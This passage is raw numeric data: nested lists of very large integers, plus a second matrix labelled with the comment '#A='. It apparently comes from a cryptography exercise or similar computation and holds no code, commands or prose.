21355999373749337573603159800675824211406070875275292115502094596391752142319469534893741796515648432042951350167932857556174399139422364457782424467262928938, 23834444326726331221028528108022556489814736632017510398731302160068757740391361581494367737982148161701129409702327361682650154777435334571832174344168669004, 25065206325940194447147026364830249818311321789047854279801409305316474945180260339167728073752143466506721882197231032753953932302113299466671025309113717542, 22430849456356619067326993691172973312233791886870284350255796612591215493492767036131871962665945922625037902599821414776115330158048579078164078706182185222, 22768779739815835705902697802231880790689488595954181242739284958399509060355777590852660073717054209779661797614999016232424890145731143561700190356663777152, 21683561482284402315008896093431865066594702071645121821779040344625544259762475715465949147537964021735124066592565496839789647705263302778574736313991353629, 31373250538356587438416711479282170635467620412914250237586342132824332830192444333592375265364240339666429966935105423944300282632283041056161247203211248998, 24547835043882094918081760187283234819984765364617819012195482355676869689417651231043658411721209282776717579548634644939964736006239999051289821685024561086, 25931380589753775729528800680009378436523442164310830873540135241675921344345067231482340485233565548836407772597977198326473965737209102305349961339075351216, 22418873520912420498842928188834189749056141306630998322423879168336021002777328272083497062590256085443288781105565176874122385032116230298930442922096256246, 20425954663767511614866612325361540997461141083340062355417145085235085340280279824991530705736820438238278719843455624846216296874666714541075789004930066026, 27909709503752468793260560012827867627288031860325840055225089147980616854654514032213063023624047761210165165420286497422789443899878967731412181798286701989, 23104182447032999798159524933948628926172890633114902087179604976525335070599746224721612845648775887955556364231130077688562818373385363334385019711869414866, 26831920082579893596083810996970546094395362051269013538268304850742410366575753263341397517619488624709419788763914600251542060636071555593439335884614875540], [33425529989338609431614546547258665319159398842768439727962677859885264152746103229174456539167997784402914506373370002761722435764306785993979977899135802018, 31641951761614734840447814408965433008735211222506852562621790265684472011550752598982780885035989978748541657546696979452887813221209282455989828535154912861, 37304647092631348432234561536113034828300356517375753117374209738995309649998854377050079315552411705504010619338581305371824168134125809985326930081840838656, 36231803105072273173190065871237440330982424208893608025354347029996331929114802694828254945773559454322907041390472799297814315528071268445720960645901820254, 27908567867430507477552048266407957113498770868106507536942210916968947013443260810981179402962255934263602916762457589696828054071282344365441265543647913346, 29522300297299309863029442757184577905903877159305598821215511300545718152667776620196619470038460495755786197910743331318673722741299131517554235508918046270, 29939819842048549787054785507871468359006615847836183037651994973250727543598146300269364429953106442310108084476882690048337908720872923474894482928418462330, 31524067234725689202740052225145319145353531294102443669662253054143687955787720407255681677017299993665338498617874772687319552175690347171684138698633056767, 29008790047578464653635922392398864174533619991903149048711805881941923953555376942066404582123412335146735327831171552013647993395957020497133929532628686868, 28542077067085761201000731940218673061322539078091858136561728122017204605518752093418867707883110558581672305738101647902635255336435302528581624299804573318, 28884491799630694433069353551836199412704419721621373483446689146644189679470265781792923306841979236433370425511060314888846321882451751812730049243632297029, 33185726774240458476865496045050399364206651120084755233165056884600539230421759076558534717965889448855982709576853444775511210235347492253891933884768087530, 35477764528133163636840348788428994792311126540755998164955176180568554836301207952877418672955421754655314147719046346172436437022673504450013715819060187807, 30307093235323870566072259449258783726782452903684031586825194104630865391682101667296970091556799489380969077695284790269052926182246594598537069761015578462, 31889711659574745204809614619663676050476446343426013316459577955212216524295959420964584629003189293902675801826508174725507889337901217663524340579587714737, 32630145645615821357869941563251198404770130546024520343534755906268330234326732698789415451991826876334115897057707305504422998278920769449915818137874166806, 35634874445525734972789014172811894052850542088902266001036384971285717209609050335425398790792589063777008537628635421007809251713174613366334020666748011282, 36001168627667152004562572850339995467194157357954216131328159536184707000455291730404788175191068565661612701254823402697059234488713373813270253119601702671, 25841428770788975372307189467626561839260425711821063769795479762116256907252857736299474231423674721099571684852375690442512392254541854627237327106903842524, 30848668216213520986976981976950977597772859887105539610225351459167479308094207310552568256077820087238627758452168662008201456899551907966576669191865992404, 30900226061476886291422285490731263867773470601649241891958299713026269677990608961972164441275910641521208428127546416181750374938116192928122255032738917887, 32014299338875407667839277382616567788557819330258343439060897679902215460021666214195919898371459702980616506761237014965176879348822102939552315994189396635, 25838691586711048573925982341054326991359321761480408732872514575524920218645539214913001556627840285269127507966316232056932590306434766147269011815528656534, 32623771997727525392384928620021186403508205018861396375318163511908435829257116849839178407409233612076525777537137030052513259168118970305423195030508728650, 37273794273364455573571991239501845315622323753942640744799894675870343169689932112226668008051920966278930395675195450154412342495637457451928843043476198635, 32271090539225710252690931368398845465433113898835471006919602044605911881968024815573278333253699668845251302431169651539961475326091819477380650918324653983, 35860116562290993538190179919167559072605211510895618312755033687234641469091418026932853893216065799829379397519562358624592701432823356544152815081217281614, 27131663813260034283351745871074587429478630224786915535910022924794460729800732233104642275732427533367636454384153666135848106229869528257746966483316700936, 27920985409566379587483100378676853257989847666842474966254369602610769992659200758206171027362548353959984020362596749928271348608786502928112718696953017208, 35026360157609419878183746479866908187633090429900530825041147704943489243346330312436379159785978038751967758713137105907563608361420758337859942097757090311, 31460606001074243369042016399849712181149534012914869116539865520260249264973766095439127600822100837549997167249915398358383234800075161592293896203860896140, 36135780863323170683012145007716432457542725762455216306214133696424527707604480033083571272607200085768845612190994264140114326961999936408862431534586380899], [25195407173590694168094585635840346387596618126472565549299014098291998781561255193649142439104411473699731221753195732286111238072865796617512128043575493664, 25305844645464110100341554715821664258227747837865626667250405382061779913018710230314164878368677094413849281517330085543403274654919509148322810945827099628, 32056824766221115798350549825176287870767888341867330529439202182237922465092704487676873616163715649864958887601151319280752589653634615427131292276904186547, 30304121104547436349202811180911213042718367710901166156156099194450111839113448597832247251264390250205242500237496538255717124106368359630053876845698012849, 24282228465031789110030726867091428060242962361703587576236504940008278253723333940650747868138753738718441017534078077908005874882058163937864692889819677447, 25066377033518652821489922747067711814241218291008514158533247349635555060115728226535955749222704276965924401931679854201030899904719021163219000335660808171, 23787806718071751323949715508812246824087924069074723954038366289115179380611891067771476608612781456790241313471387401123446779494137667874768823664842782089, 25566816418227855574959299446732791634283210047531211752784116919961317242900088137581665414905140673552775437526461880422544110769199437086041028270252749892, 24708104276005389751914503386692606153542597872749276667931116141296106695991748199867840916647202372825952868710193409519272441382818093929033850936060836524, 24527639733176029030593234431047957566321247667829393894568421267094200388322186276444763965068801238481575341643358879262880940235596277445885062770087151403, 22078402390405582854813379812945143167679394266550371024125207398101215714343428704941411049976808589015808256170661855637319981022837878243131664899147010420, 26652415542330444976472932383461829574518973059132282186142383526393869098532119757105911127030450932811367765634580877825358616369886906707770924771144897853, 25433878247018951924549546574724598609279058505227960407121604571063447800801500742433552183650039362592120322034016190752154157370110041874585366844657018262, 27393530843305106320004459315386009373011887219180162145800192086315307768352295276670638625145719290477430993010853839191148100566448531375700017494939156443, 27921421931529257646378716649928452628107276828829582494117961225266421699457024468358022693168316182123077395022113879029658779661282816754091586284934111509, 29383734773466056571520572443109731970596961913876869842027299978811025159008420092013438904104955261866701301799738516666241655558132911942385125169573589956, 31796179242374638358062487348223341041874586733706431313133456310599393886284411468062016178425875232762093623194466497853792105810426574557072545748968670757, 30583715847175432307482096710922719660665173422213428538012598596022446105196930063361904807839396184546132890761076698470017908106194911561751846499261833581, 20046820439871979936878068468636785822816011360288580085144088741678663944999283933421038579926508208948231820466972969053140181944043274023540630417225829477, 25929948682107666266843692143920998671946313572943353805034904787494844355951421957852347885633821086603938593090093522947510253373932984883216937758300775074, 27246538505984559166420433013297520190999625990878993049015656958160725304122828591495194914407807946414044169098729925445604988724352244318494012505976806004, 27950379417067072671042368569313503073228529711913188411191628853971948239892442661642622661700841409760013781991135908372531931044158720432880693232171417115, 22786393992496724898659610722203191259275694208845159915161031692673329548981457860660596144080969102430504967525002812043533914954819378166984661893058096842, 24290213889082839170012490188185070401474417684282074619527950102198857684914459489421260055250218894380100906627680789433830944623819697844969815657160340090, 29580726840926094720625279112225453844525676601602630182460008026205219244770290520294596493389503229048946243306005569238378582958332751596155752403231157583, 27243533686760287523974251346021640340564622618080250854361214943471349100839095402897515276763168631219211964989657276219447951639324447758327618690772106946, 30981262684795058032719072706559418693168609283468181198481310361455100879206138143312373538313458015583469711860114320066682289806410064777645478184697144397, 19331254512378212014060945552199768479595629285791840063118893333933290913510605102276010433120882216196075299083940769011591696123898048804898480195899235125, 24843378029883430424437996365388110480782717325064877207793383174800518716539882328569535515616887215993766259344317147918767287836049012582896938608509087627, 29521648781427111958413849092710589356368080921677324974864679522029875680940509787705850037125872532588011893058436361807363870275783449125374489599631286255, 24444966790875187715148046963361010946592272491247441014411255850276245640228556301452112863792114518863597771838685653642337912949260191623792731098287875538, 27795177550369356407957809614014912689674288281678763547388027267777810187500929801608039539679784464393523267564508121710141479946655850071688059378415170957]]#A=[[12378921034195587699211048338707146014571505489506054132456876563910105383972662092125820862366121807162675585833468447965200142948240546770438294124817953, 10199319248678562473130443983297535554855670587030595542573749463488903434055217737134020815248744161725479198048699226420937839423752461358825442782424184, 3483193816416136060362773571515947734125890678481149484586660985629669285218756896814021785510228264199794397954827331388075335359379449395609581444063330, 11379995925438243970682029865615380097000149443566528719425658435185236537901064204025645163374863986962709749986477895056868465991331101784385477379241258, 7692171609297327809468566450085142095232386820056393372441687577147996464644141383650648172843296682304483867704622014699323968358299049052371088522248332, 2697863807937744164870537786290472773788844203326454540292754412350403660079602574088174626234124802051237800766854792092292311519658612001759946323393781, 12638192365846743771971115300198554856332357878316284013894430067634471857727865780031849088369811618616114432684376210892493062721645959940419830823313791, 6395428545615046465810764059265399553131602616083437836351507158113595476321868009892505090213996957305903434661432165135397684182996447321241871675637507, 3043881759731703697265269039093254765806576995693157486102087406569927390489119110092104036890916252084186811752593503007805582642167201274579955437316217, 4349884086580283215724929912093470559826605658915197698655266131055437678958145543695782093543381115466953420655656171302520428672235880971362425044853911, 7554651403220932202897063924034719141222581790997987258670828316034421230310187223331118516845605181001268981941631222944917487881550520750459108561336289, 8050679939560102336156046716944471409959961693418381250669753834363823198181057854815463030794947518178336028011161371848961526491797404882636460128662816, 9155608114396809249718468231641381411126090137707651273578115477825334898948788532718275657438793400806652474810542005302804596659603545971871005612072143, 6581105819824689217203107765697957171303523061660295741451801762660096720319086658293887520021096182015608552149776140843351343235805931823926091897090680, 4920449626004844705799502038390838149148860179457590558233856307366683380681000153105695255608242250375218221167671664748907859593410157639875018622503808, 12942760968530714018408392812877420047969590385445850249771327717012011531242298426292435050007317423575270105830103766960227640557820045372643066253353736, 3215314101761146397137930652830292734262420966930308417316020121345192542788702944911534463644548343230052001325542258261357679445284917871751471485236429, 4626381881692615368385938158366099381619769752485418087965196901617866822580785136223364242244374127594471480949628877738928603543770206849515163835399575, 5732559321627647403476184548207737577474548114871160094340167472641129114176236576877244149223490558547746884834327522963107371036793823135629946515049575, 1461035008239678141358046324519551796696057970653475993445017691756695160560717966444545533329024510469290240991470824086219129488236096348965913034489243, 11564934273518060618394261182014885251828760911363053051533510067113570602577404567126294934505099124833597742059556467485234162815025084068191012735011524, 12584223966499299398957803156936994554551862321268495276370386164078541173992369856296779199153279754094014930533881013777710528982340196528425591588648932, 328112692806709976325900620198407916682910467746393749563435618361422622463028262378522208833265050375717065643495800567775895755084401872806093695423747, 148846646230130258450240842454393767021915646344289211864567981939548546210351182484065324690077184995389678919232566363534855526910091421477649247363323, 11593403446034445752903225971154525373527114695805492724109688839943849140556320433771789333053418225644583710100693788139684425998855682904285043913311308, 3018644975207486905153723668121312130291667841729999069579175892433551483057255572699418485831519398013441218965594377824261594521667474822381402435257757, 5601263315506360353095052918893786026590029381171141114855506448595478276809770758969673407764035672190694893483768782518875428254817084612956478678822115, 9575446877769866160538001488678263879866045547342207992743024816484697851506026157172575551912978897299569997969828406262336632401911819723743542151397289, 7765257475051508718698674537869319791127569617162555891557362913126992193998341327776018187304166775159538624916534025296897863123316934045052573897373082, 6076204465595041324797236460774159294930215617066367316365139541861266488959959232844547982029568468539532181445427358149378278038007166286382311559792986, 10168618533577014936072199515148239752221985018630176248217698486432127236208688078244304243279100845904553366421274029652892503345047997821156943997431179, 9142317953538349456492675556804943274260276889064939047521376505944451113561439272817561598610756581678349847650870736455956015319353993792496317839828149], [4212417038120784141957965078183649806903322603182287686764478282221028443377692213031879523359446895437087358252456449241432336420425043945488144781815468, 7589532541291800509343586128322864140387368654985128812641978653166206601446888553429252023332143628627068389603717405318991239865916207232609614562025101, 1022066287841285495707538628059629427287645696845075659965475755603482719653070240323120457516828812769799704871114664809834140770509002921701221752211276, 7573774804983019687374804426477747371580148043095800809540734798084516353865881223117548243467931977556568235159006194954153331144741306825239266503748844, 4217947638836187811735216602444135213926981770387768668001498612844597867034924832390896943929667287865047714069358390423133078120331680992849829585660293, 12556445827963516340575964146714844156875699391630424091145204973334336800412984244411369566504938189533546591889244139604497372160848365939865461582145058, 10202117344845380212717065172933489324326886450413862092881197065279457181190294704234494529740933174907094395275198112096919562610113147170653926174706793, 1911058103714006790907084583889281848925581142959334221364310879015754590126999938325400673590307796142754521480062714586311247711201230717840778972987997, 10645191031999478390651812512664048954196147435740475123426912547846439160537742797973041392673131139503309182026251383408432401374341311514626881714582970, 843762294490082832546531460534163149345986134060226702537588429619197242077755539317538627076993457796749251075685076167623827470695024315366070817263738, 2220648925737919086766224436465158664999654456696721468446293915997871977966183032129720411950158941463825378540817620849585398214938518213133007569317670, 5808366177307285412718781369142147983139932567398687034379574038570630776711375499022268598984276785090058738461416097537972495788344752019786206979556483, 2469082220963588391605614458993231669824945503774136836028100941311152817086808450274999781870521923600371887411805087093493824334511102996955896665159412, 4832425722581374040929163745972044236924254825550857795739108649248939736283555527430817065638921942854268841779622324301932065625178262638810672404955745, 4354491242711926539510925764594010753379071843810281187814844740136343526649622098754677703215057844516290514235755188364327676573055717161652364402690717, 13311639345126112513458527199864581134183222269537413830450123175062637435019623363034961839681685478683723795724718863276283343918865961213988986053010821, 1746979099272902955694134763379161222758389287828620228009484757976665141501958348739041418131137641227317405045638355461540772375885698577668536025056783, 8907261959800415968155905663380291066096907835685782740112538471636187516861315746857669620260218134480789850937388939108541233997567046356998827780241378, 12220920826569368257245772154150645756465863902379527059402389433089242088037781002965066381100607560524299818404233173583607259565428140645317297667999253, 5546557972014214508450010210682498932236779461990629493200007996847472790095219574010713902526596649893144181082934701521442346265361439835367383809323803, 1343023384798488388716352105574402724035925945337079321210424884413720045696883756259276868395479887389839821880598618050971277179598221029412790801637285, 12872175276592671853833372303675765903702846125329922823932786739003060433571409613118783012311650816916641008173920347663937207240093885430250478402745963, 6047270469443870036828820258879876363230511781959194038011098917832705845109468465195652420671776752574350322340466123663855111447941056781782037198009694, 827366022702817305484893779047520012683830845932405757956302539787159551022439556636217270716358906093960728525877718349805001867833655834858794839087716, 8446322416787288645976249677921105805991240295147337977733858776576807248904798641990470873171328894611684547016814727811919304112909770369073178032404915, 3587142706061601119448089067347882997060364305169494767743641462552520448368993277333266754060810985951078338795748955182277068659215678995395313181982975, 9080476930124014645900656639624196209264372799601990071921364175233076497736355946903946026852590693213732503190771297485235810346420302476183099334239245, 4085957210206167686965241496398895448313278996791455830967808097254081812646954729855178303109911390313393526887958255478908762069246815133881924051915978, 1211219381478767351736200913904713101437926927589709618130603146738562487781131089314273521595438698856265679446328605644453601637525229411545084703749209, 6254326866795747168793889180324284760658677366228370489358676921125290188993475491659922095351471669817348511949283339667087002510475259527287152044422893, 6742618568307100187675667751852890554577138680908573604533376865263269383227470728773969781975561026160293624135500733422463249955204306443072418157571205, 11477391556299177036494499243770944263395791528975607824154182521824081419816553296285839742842477405255816352845492316108143138014830697259498664155862230], [6748772868559329501346089556650442715977411628597428329095580202712922155408208658129875710823971906835502273889359756473886448365966451712165239599334062, 3911821779992238162073018068881984109982532991028916425515830299930380529417363286604319110691112023483017114963907111989325901252543103175819677989533358, 3979024214376883423331593535900171402322882620633488208739451009552596910723240197903889698174282723532741577421148498043792697956583224337822832245302657, 12935516155489038097510718298869286629281405690962602769319586403083845697919469486968538925200015229539520089602097911934474827267718788801646652766649222, 12620707538095060473873891654149829367219530598648263234686000463529235299781858003527218721081653856225055596506028116452909546110485844351309299531370039, 7809000624078117836850435868989465673854797451042740370361223614300612378260796861242204441178118265565273663593741148947479130894660693763385651965232351, 12730594786148644203828845970085989072401682025774695470798406259732697480424598643174606502590714890884851193733789535234336300875495714769382629278892920, 1234586526125665349185781186145283194691509793289076780797078212420773044707870733368973637531251323806206034407325957705971411463350449039177823676355498, 6316539415069032263140463076835183380698755255179977808447055535552070885262693578021944921751966871311542994445661409599481604637022300691672691359252593, 9385536470925970297601122259961878142738482000448368251293880031525679188884812146466665800133265153996754892562510090161059435730258937463658959759336398, 6124705285859667130522042435215987227890511750447024709870450241701494927625039833135736608327230837390958695780694496967416290834888793270544201198944999, 3002629360034642348387101972334621863419932200479566243070967278189195289324525264699446481253078228066311917568537190304265522546969584985278937248104327, 2923978728580665099721018825717710958194544214234177159980440256661697985280987195638546239069330754953219089565698586814615745612308337826067322500425192, 5140554233400182000651171844894717750416267925202727672286518484257821962625104551522237175969193482687948747311358092923554839410803269000366523183535359, 9301686393342250472512623007023944287006370608725032842907979171464589665167507387515611868727043800062550241081674705993872282076935762204432597707344853, 5032244675948294833892923261944155903122279881038069510099443923763512717464076379473587919844862856268536711810126186517580350006198977856059896243626143, 12545081702688948554291713266736109427784836716881010047482456162715113039696256155431783345219166839644167967194692276036759846181002503302408218109436968, 42459928372259599702503735569511743497720387453632221187029607727556267074016181396496827890109914273753552542832510046815520483809636583062033455305125, 4234681424207358608335384500120839064529733861662450549221949041471024732934732938633277400688034621212014147101197778597290932562727484366789344369479265, 7638879929160853722725732557400409569252580187945524859527440236086656819981634174676510486124719392370658882590678708234341865079322924640919688185480645, 5986354331483278448663667253506014829155037766562708016471573017840681583586771965351347992443342366479389501518343027791104516253577777255946295666619388, 7803212023067405588732045552785018019997142304643855667736438882718459011956783202711545606923693138920307589157839832925734983644735883726329392965259721, 453479115024993525182308389311477196975498973467767333569811369055902837919638195018101022854725598592963597104819329652888377972478683475013852513103431, 3738849663280938244677182709450211748772975016063264954064093791715239436187428395222282228579465926176712077904186059793306273207138294565488038440877917, 835941271761324448682237714528729173534435717065344484222748131399588774765421122748353504482616729726934451257252558426181829591892745894888777405992412, 7756691893437894128110958946904313116138503864495300017423414097567072136980973701013802536687133819297937203135301319089070243751026786644143838041943822, 3141624524370123264073631579583343562857404982643173151747279023466520321284697669828333892068317232409511523839282680995490018249652369747277004480635417, 5305621422077467159462173041296765869276960837824392610983879683199792978211671404418502680180274482994818880224138434116487110533654529085575316915551945, 12808699963669268643950212653556198487841695861236879343059737205078961606532544529060568035630045345630889113605638871519996671460274180507330212927282072, 9062996425700265192734646937972881355166905085379997088884984522221998524280189959459594470545547508308633009685109906472406174994921675843298432619747037, 9815989293252041487166434089237832104300418650319102330632163168955970675178129705859190684473826390522950030914512544169925688796254237764755496071580814, 11244937162894245417885203941161764562078071008448672362564550524765624970875791749674078275429285514523691506716400347885189792002994883391774853977064372], [13281886414421743139910414432469869322179829709743166502054760573682076895535366751660623378050468851460982922480566832981416255315272163519370829661924080, 7737372124176382708271393493407356559230708245150841158916798221519427638542506447857604242135492124276149386981672818355152248203771452850840152622462612, 11853670698398706793497046311452405437070237742350234992549693278436758580951140989259713817942582515820415117345508092181611074814159146781453629081470612, 3221929336282881667159417354175939125892974796308509928048939493764164921951856688177540844406956314195836330245773894236495471337380855886753490541348310, 6373554995181000538278559908342073119645145196808744617415195929369727077321754538138434366889914126507973303004589555144245964001993240814718227383563015, 4250951955015035563396604062243431468772175028178008834605452712249959680181414425085712693977263616990696789711592635560494800374567499746813295690546192, 13389703782921665074041447473828223333938325086643107347871050327144341000142011210692089631832934018144411096589807099997039381790012680458211287252858932, 11932655749833248026567568620992313011753572526001532127632670878034108578008505798809852468140070932619862172859354885408045408102352806701428303714309505, 10539355134677752620329035138285068043129202772700031998081606885601103010855310491376779004209639674925732500602739822114736492339824125813679010253034178, 1297947955016358026723590516843080858039962055983004802599811075557374077992727326407079857677964914407907739545801928995472507852385068414132370009394329, 7463781927632510797866767485954862462424627523596657678308557373175049868616546625008607621302150078776393823039267438936177966962574134295675809096540450, 4047163135139568136650492474830996637090435775856933458443874405331126870400075381415301824613098106581218958772914397562642676735365363649751423432222330, 5915386790290900122141452433443824121764129230251401367750187919663767386966713450549266835647613523141940811470373938779820052177068384666996331127975765, 175751960089107650218019750866679769927186542367395511379052896775315362924868855441735917350072422505965500728041231702494254439089843350563531063150070, 12357637012722403018317755304496579105783153229397255581284671819016633307006285101621653851258983138564267004305808985322213972910723682548237084026145361, 8599026532419209748147495453870488429190502931962113855651024133313758475187121887245173891795694873080500994626338133892121330440400559454778611615847042, 3970461633470115758753901032794378666336853786895294766433048308380519896084713728808414790030185803664867805029259247096582821130164132048865685075635626, 10994353072673249945505925705123739861521297442579664375125253276168049336891923634023617612037241972728308866647381203089236152708986013199871905534252856, 761393239228584040316124761359271780333349445314437031936575163542485315518766218117913572822427033091142046875654286678077652250893511012194484789369999, 12116452369649239749047118352090538879736219470144597489093649858604375962802243745672021766965249119831251422481805160363191523203839597102821152142108702, 11531420167473910715562743325081391958803338036458544287540795116164192285912776940827564048437702274501004605259802550908740213935064798641975434281261240, 6207559405866297819060453846295622253303732530043658976566292209521406510776478827738176670314887854378425124871861652169874269931550211808922103319068838, 4750520293259751296772896529719700074981082457013574552444106778673205652837594231781841874841013710038947388930699670179006583060209369134725117701423130, 6766648365260475341168642318386737868304205698819151370102367999487091720439736210993932309846979727569075711643438781948489583389224639996377731192177602, 1453429442060645112703040470588036237036266398031934915559474509806626132375656173547265117705746555905825845588836397995763187479335540172447624168503245, 10630729185211108515503074153360874686759226820502101256408474738961480090878880407684302216547798221077656767637786078732691099760744771204089966850087862, 3936104396388964552227913486342858664572054830515755107566217072730113403652178551346600896151624992391645164436990180089430663413689969821878074242835954, 6807870389159597813582784540940733106384374092821881699219833007192237170650465420388986967771995909048424883168870886931882339870134651626522849436693573, 9177110568606280421559247046548759877288092181987199963875468955320173872499349316352846665774146149652719907081149471477394672306245484386337799865244580, 1596123674219206448986022663113548471698400557892619871019311199906437938273741969805283848067436433523918743277614349087594920981247153560984968381896733, 87680107587258098770710466451319975965105786708928047345525950703185157047595275990385518436181893495622160492060557328127734257564508593935870004937202, 2697461060431394538811986406775720998839751773805299198353518705445875948281595693927164116363626539871276897320662186350637439542433973234572018819324694], [8510657238213709874552527898678568395821645967772333399317254685759696542545182498788839112026033935954882605463199730337765940984821080511100178321357749, 4371900693725059694382409673011734776669650961903130417182849862694163271296828066929486503470807663330920647172705151561755530301012695129320190789207199, 13304890788779238285739701292725167953905105332842477843118248093217844894015906073598986783672162272227718895119688730515776556494885476562121115834644574, 10404961560885248279980627340106634641170363014934273404237625585548373129378425623214237159100401573273233104667382864251978577186724757689051158736645489, 3123719894500016014731295844802739261954929550810525995815552677911614508340540289861325613530228125304865374933068125114751761637459740197232373312658886, 1451080967464880794137232262637029909418403463081290205282160896855926151387115324938357263138995044721731472591460356937021670090666286221884181768884920, 1912685530498183814805342048434132253148858902838231553210578908867261562419986587275488120130792505856782969332794951533496450168172858749210507892430519, 1558432800637701977932166217601634910448171822983216876063439628504080353193133219874368563641090964040320859766762852469715475075591216606497929800629755, 8389815889332493757936997453980239381160271726085090712801692874546595274623801376848105016841565358549803684865296396015120658897050758271560848722480458, 2144706514902934999157359867781734332342540800622217493317958219932121390072750259505490003539336629677003294116798591886095593219361804353926104488814967, 8475148171112390563811447933042107539574640580659478948452081219738929036284258277832329447447316028923391437835962181162847768536720673460891347867375320, 8896725426548741126373237238532856787590994440837029569361534519643191693664640381491813583114125906653602029096641675160164500870641295522897766259508937, 3286561342094588113396553313076569043751862555905073807236662785365316469646754152300733270149272406240828713442451057704045801331207898948846405491832001, 2339474589108330434602134024257557510347658947699831772654475490583068369553627353166527017818381599847614879586450905906244021098905387447127954571728508, 6994699903591541452723680789475342180266306069268206006655837723041468613330937839614100186734237739443558355754802834612496592821951590350388069536635543, 3500507989058067875657463041476475621485490641237236359824109176007963685620002568812229850856349791405220143562565306468360583624383373398613404937665634, 5423938092767027122020904751441823169106883371816987795904794683918995156789300525968120617809550834846676625765665184495259100888565551553284618001771243, 3999058310241938857094052011101416284767566768524537191601293691118043418902715057551729161101945886224242377893882330100618351203196543548447831164569457, 3523252831992677220585455326139767745308586600281594951780794762752638342916038429405871149602520017373713787462957038385435111178955422781124916820858996, 3108692291150273776283833349236371276412396307555717585781801803893593943452500941480574533293785765987337520702836041936790285616906561013597260235123393, 9904967180737282511364677088170737533752923613053989735385607026389132174185187966179564398981823684717428542429225108683676443091254916231330108923649075, 7827689387523828917382362144475689780233903834144516359372003605138915308989677679216292156320836978271766921052859777473172152649616531170400056992027591, 13111641459689326428663598913506239917195574218266794343715141641886516214622475578742961120920758290266183152603068964839103894475510465342839853069641377, 7171823344999446472768147444691160900545340905595891386761482236023959248730429263950419150456638356812308985506013007889107068870818384180464941836480600, 103390260746746338493836880918109263700627511161658255615466211729292402036152587857630988336824405039710218798096148027314791103444847988234922608442916, 1916464015450072718628826999595698596161283581226525116954131618776440661087527619887432150220261972406808289588930175864787314139371477277372802602031950, 2256300927448394494842428968950210038506466220237392041659078434820597462972768901711520530619661710709936820773976624960283248932166274906946477411095644, 6869583066771504610866944695226036814235966791472845948916422685554713812227333488234509325261598043500839624953483617040169181914053736201581065899775928, 7558269052040329803592322794588590052276548813257298690851411320679662664256842931694040145781390480866361110232000297900424488438219579019964822582351883, 170575207052819841363906713143315348642298219196733650676132258149348509405801256237746489196185932333594710858300971766324916187707797610604007518737800, 1427340623639980788857835917631445846294079732903039374253558597810844807433319688178111835949493839015959167784717718235881453148126750766263085998896409, 7414475540483469637935574636896035668468290759942972697967272234247565098792533366099185984526407316733406881659517460146581619769746596303546973424356908], [12142483811378716840495615778344448125174296651628512954837163946837606283539512726893478981818216616220905697496733568589722554091552336133949666166067006, 11003390201316055613271887910149048412436468627879689766677656816728156388741296454539349547948715602112673920895600220420264601554407252703127149462582286, 7453135041703930074066272457976206703558348875628547338023615846934489140856460344040928203342901351991241976871981219148583133426011762826157623487141037, 6332940949395253999667663211740607660409090616068167524623621627840098929809323504655180675504372858420783049487932241081160512776607415039500098229632408, 2809738687653776997709383304700368785004216527127607790040796183907090834626036429154616626372397225402529972780851766148487399683698591413460313042806348, 337411872956541295388550373631141798500340674042968061986145444618537597691347559384227854676160387710034863737490412129413774726588320144293191030007714, 9413802295728007691682131765731581964449020505351344688734493780571859757739389600271252283281892391987512606858640013956686444905869812223727763962821659, 3937728287702890979914416293057280700115780783447472201876492818083236004772760578309706354495046912350469514858796817774573449059711580840120703034496516, 10964908159585948750530496853371756521185150859463579111484966466723122736245686594766774092164956707137429388939796033038735096143552915755823842041470341, 12310784871482899867434736070089671313907254777797308839888143984524729275046949452593243426530397102166618009088258577496082117822110672547011041400339183, 5347557390882443971632520558810618992206670638452500179477196387417970869395843129646319365098891554865093596997957867217145722136756305003595191105297654, 7308785052259486090999260199225711451164976873668304172693603102663207887050672490968753074210397236431060584915244308989996510709760329636084375239989684, 2532727956012653977612191911685559695834476910112516292268947950969756027146848222727409102620240987474321029161650780114197189772124740826807139940617610, 9003662592399295538225184927385591181720588574263765362289659847891809831144892187158461821977629277167750921399540720839077888892954738804237464825901633, 1132670887828444955745699453125735317027279526560761159814744672272756799741686134170705780655894989013237523558237990539512161561932551754287428989115701, 9550647057759157157330402937828874872387082558793234232558023633141053786957849305679310585276524398055703916058708347399645004969285885654775158489140851, 5048601118527803528167195006928776599885966620128265536260337162624709534226371407181893458914469815156406494687973653492393891594505988983472247369555123, 1135218086896268641324828265468851615324936808572711110681794028651164393220668485776881939451644145188551457158354100665837081900334914677789030440314153, 1683409912128320146130942002518179255482501909836752036433604081459741660854441552113202398448671918921474246458669030987303680604424667376381490989004463, 7123821091743681789105434367718210159946954389992635966329950320512696888172683047823071985924290941569701326389178216827858614985969992908465088777515689, 126167717651795428576450102398117506657115931770246201618589312690162557657513287767823871101467700839258618929745882611016483163618763198030422964232622, 7519673367990167456064369505523220147465085045988504332451780328609949419673487110364126057693631374669856183849672995802628622471793980678193426606497703, 8070727240218578734402002455271780916613630026779725341097918281293045970208638853153110855570073258914681776841753933446144988508246297406071400273524218, 2621807926134178732052978575347465182898916318264097037000078950375006197132752172757516353835848454064464610655084730872832307168246044544526604178739382, 9581671780594117556013722086982578194181969557954447866465660580292494931143829710386994303290597308842784046603458433350044375731870357825768028870757250, 1624138771972957511675366700056522186633499101889457106207058090936331758644223707686098535011789700313505690467298795241018923473171034446361749303199512, 5235942670806623602622635340858401382302336468891208112784678231312580718909555815112432676716617011365393556788428825367637077686710533702358131207989658, 8598879793772233144425486423664888950402655280230823213475534559515236332932228202560190420776827263022482517723555500175873671887144447426327860114106119, 867510303446804594075851900366258637080490394452172028248536084662057502872486751728121692096798189436503085170326889604888798137846192755971925508348111, 11338902143127907522322343508558915740268268930654249611074821497712327266177125037720174435486106614574169189730606930166166698724175981015965060878855410, 7269506660550960183760014818871968954797660391513991579906054195317796348262429728862763507388542558313865648500044532066629011590468238023267425083731572, 11951811771103612291068841552105579093117290891697882359470993296399125809214160963660155991252690973401584143776832533970157411939224750802774190408194394], [11346819400073581710124016754540934332842189949746380664426129812674591480855784795250119382377114492844362585563911095550555555490437227058223859102008679, 771743711968543489526621741582390680777899855919042782064897539407507809674944764077638935644416311288535824960203935508437889044693851359447787840810905, 9681521918561055526319905167763352405097952398121045287224815252832215249651520846033659104106412726225715016942096357684603810637599635970748508638908613, 10530543539842314671195722832889228475874564641359847970891406352297463950659370784723700432876856242681885514056413036526659595490081611829361774908393619, 11302047270057439330492500939217589537133630241517106457080253085927195464875787675479227449137393236013150547945847284622722661688261524087424908145851870, 9547370355318495584122272665689559636377576316066620271011653331129379982419400334226911165414908563390680860739361513459687959116165855452663576632176986, 